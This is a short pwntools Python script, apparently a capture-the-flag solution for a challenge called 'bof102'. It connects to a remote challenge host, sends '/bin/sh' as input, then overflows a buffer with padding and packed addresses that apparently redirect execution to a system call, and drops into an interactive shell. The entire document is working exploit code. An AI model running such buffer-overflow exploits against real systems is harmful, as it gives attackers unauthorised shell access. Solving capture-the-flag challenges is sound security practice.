from pwn import *
#io = process("./bof102")
io = remote("bof102.sstf.site",1337)

io.sendlineafter("Name",b"/bin/sh")
io.sendlineafter("snowman?",b"A"*16 + p32(0) + p32(0x8048430) + p32(0) + p32(0x804a06c))
io.interactive()
